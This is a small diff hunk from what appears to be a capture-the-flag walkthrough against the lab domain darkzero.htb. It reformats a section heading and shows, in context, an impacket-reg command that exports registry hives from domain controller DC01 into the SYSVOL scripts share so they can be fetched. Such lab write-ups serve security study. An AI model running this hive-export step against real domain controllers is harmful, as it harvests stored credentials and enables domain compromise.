@@ -613,7 +613,7 @@ exit
 
 Expect `C$ ADMIN$ NETLOGON` listed.
 
-4.15 — export hives server-side, then fetch (Kali T1)
+### Export hives server-side, then fetch (Kali T1)
 
 ```bash
 impacket-reg -k -no-pass DC01.darkzero.htb backup -o 'C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts'
